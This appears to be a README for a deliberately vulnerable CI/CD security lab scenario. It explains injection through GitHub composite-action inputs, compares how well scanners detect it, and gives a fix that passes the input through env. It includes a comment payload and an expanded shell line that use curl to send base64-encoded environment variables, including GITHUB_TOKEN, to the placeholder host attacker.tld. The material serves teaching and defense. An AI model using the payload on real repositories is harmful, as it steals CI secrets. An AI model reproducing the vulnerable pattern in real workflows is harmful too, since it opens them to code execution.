# Scenario 18: Composite action `${{ inputs.* }}` injection

**OWASP CICD-SEC mapping:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable workflow:** [`.github/workflows/scenario-18-composite-action-input-injection.yml`](../../.github/workflows/scenario-18-composite-action-input-injection.yml)

**Vulnerable action:** [`scenarios/18-composite-action-input-injection/action/action.yml`](action/action.yml)

## The pattern

Composite actions look like trusted library code — they're small, they
live next to the workflow, they have a tidy `action.yml`. But inside,
they evaluate `${{ inputs.* }}` exactly the way the calling workflow
would. Any caller that hands them attacker-controlled data turns the
composite's `run:` blocks into RCE primitives.

The composite in this scenario takes a `message` input and splices it
into:

```yaml
run: |
  echo "TRIAGE: ${{ inputs.message }}"
```

The caller (the scenario workflow) passes `github.event.comment.body`
straight in. Anyone who can comment on any issue or PR controls
`inputs.message`.

## How an attacker exploits it

Comment on any open issue or PR:

```
"; curl -d "$(env | base64)" attacker.tld; #
```

The `issue_comment` trigger fires, the caller passes the body to the
composite, the composite splices it into `echo "TRIAGE: ${{ inputs.message }}"`,
GitHub expands to:

```bash
echo "TRIAGE: "; curl -d "$(env | base64)" attacker.tld; #"
```

Runner exfiltrates the workflow's env (including `GITHUB_TOKEN`) to the
attacker.

## Expected scanner coverage

| Scanner   | Detection |
|-----------|-----------|
| zizmor    | `template-injection` — applies inside composite actions as well as workflows |
| poutine   | partial — composite scanning is newer territory |
| checkov   | partial |
| kics      | "Composite Action Input Injection" rule (recent additions) |
| trivy     | limited |
| gitleaks  | n/a |

This is a useful comparison datapoint: scanners that *only* look at
`.github/workflows/*.yml` and ignore `action.yml` files miss this
class entirely.

## Fix

In the composite, route untrusted inputs through `env:`:

```yaml
- name: Log message
  shell: bash
  env:
    MSG: ${{ inputs.message }}
  run: echo "TRIAGE: $MSG"
```

For defence in depth, validate the input in the caller before passing
it in (regex, length cap, allowlist of expected senders).

## References

- GitHub docs — "Creating a composite action":
  https://docs.github.com/en/actions/creating-actions/creating-a-composite-action
